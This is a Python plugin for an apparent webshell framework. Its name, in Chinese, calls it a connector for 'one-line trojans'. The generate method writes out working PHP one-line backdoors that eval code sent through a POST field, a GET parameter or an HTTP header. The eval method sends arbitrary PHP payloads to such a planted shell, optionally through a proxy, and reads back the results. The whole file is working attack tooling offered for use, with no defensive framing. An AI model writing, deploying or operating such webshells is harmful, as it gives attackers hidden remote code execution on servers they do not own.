from typing import Any, Dict, Union

import requests
from api import Plugin, Session, CodeExecutor, ServerInfo, OSType, Command, SessionType, logger, utils, SessionOptions
import json, base64, re
import traceback


def get_plugin_class():
    return AdvancedExecutor

def check_proxy(proxy:str)->str:
    if not proxy:
        return ''
    if re.match(r'(http|https|socks5)://(\S+:\S*@)?[\w\-.]+:\d+$', proxy) is None:
        raise ValueError(f"代理地址`{proxy}`格式错误！")
    return proxy


class AdvancedExecutor(Plugin, CodeExecutor):
    name = "一句话木马连接器"
    description = '用于和一句话木马连接'
    supported_session_types = [SessionType.PHP]
    options = {
        'password':['c', '一句话木马密码'],
        'password_type':['POST', '当前一句话木马的类型，支持POST、GET、HEADER方式'],
        'proxy':['', '当前代码执行器代理地址，格式为`schema://user:pass@host:port`，schema支持http、https、socks5', check_proxy]
    }

    def __init__(self):
        self.request = requests.session()
        self.request.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 UOS'

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    def get_server_info(self) -> Union[ServerInfo, None]:
        data = self.session.evalfile('payload/server_info')
        if data is None:
            return None
        info = json.loads(data)
        for k, v in info.items():
            if isinstance(v, str):
                info[k] = base64.b64decode(v.encode()).decode(self.session.options.get_option('encoding').value)
            if k == 'os_type':
                if 'linux' in info[k].lower():
                    info[k] = OSType.UNIX
                elif 'window' in info[k].lower():
                    info[k] = OSType.WINDOWS
                else:
                    info[k] = OSType.OTHER
        return ServerInfo.from_dict(info)

    def get_end_payload(self, payload:bytes, delimiter:bytes)->bytes:
        """获取将Payload执行结果输出到页面的代码

        Args:
            payload (bytes): 待处理Payload代码
            delimiter (bytes): 包裹payload输出，便于正确识别

        Returns:
            bytes: 最终Payload代码
        """
        if self.session.session_type == SessionType.PHP:
            tmp = ''
            for b in delimiter:
                if b<32 or b>126 or chr(b) in ('"', '$', '\\'):
                    tmp += '\\x%02x'%b
                else:
                    tmp += chr(b)
            payload += f'echo "{tmp}".call_run()."{tmp}";'.encode()
        elif self.session.session_type == SessionType.ASP_NET_CS:
            payload = r'''
            public class Wheabck {
                public static void Run(){
                    
                }
            }
            '''
        return payload

    def eval(self, payload: bytes, timeout: float) -> Union[bytes, None]:
        pwd = self.session.options.get_option('password').value
        url = self.session.options.get_option('target').value
        proxy = self.session.options.get_option('proxy').value
        pwd_type:str = self.session.options.get_option('password_type').value.upper()
        delimiter = utils.random_bytes(16)
        payload = self.get_end_payload(payload, delimiter)
        ret:bytes = None
        if timeout < 0:
            timeout = self.session.options.get_option('timeout').value
        elif timeout == 0:
            timeout = 3600
        timeout = (10, timeout)
        proxies = {'http':proxy, 'https':proxy} if proxy else None
        try:
            if pwd_type == 'POST':
                ret = self.request.post(url, data={pwd:payload}, timeout=timeout, 
                    proxies=proxies).content
            elif pwd_type == 'GET':
                ret = self.request.get(url, params={pwd:'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
                    proxies=proxies).content
            elif pwd_type == 'HEADER':
                ret = self.request.get(url, headers={pwd.upper():'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
                    proxies=proxies).content
            else:
                logger.error(f"错误的密码类型，密码类型只能是POST、GET和HEADER！")
        except Exception as e:
            logger.error(f"发生了异常：{e}")

        if ret is not None:
            i = ret.find(delimiter)
            j = ret.rfind(delimiter)
            ret = ret[i+len(delimiter):j]
        return ret

    def generate(self, config: Dict[str, str]) -> bytes:
        pwd = config.get('password', self.options['password'][0])
        pwd_type = config.get('password_type', self.options['password_type'][0]).upper()
        t = config.get('TYPE', 'PHP').upper()
        ret = b''
        if t == 'PHP':
            if pwd_type == 'HEADER':
                ret = f'<?php @eval($_SERVER["HTTP_{pwd.upper()}"]);?>'.encode()
            elif pwd_type == 'POST':
                ret = f'<?php @eval($_POST["{pwd}"]);?>'.encode()
            elif pwd_type == 'GET':
                ret = f'<?php @eval($_GET["{pwd.upper()}"]);?>'.encode()
            else:
                logger.error(f"错误的密码类型`{pwd_type}`！")
        else:
            logger.error(f"错误的代码执行器类型`{t}`！")
        return ret

        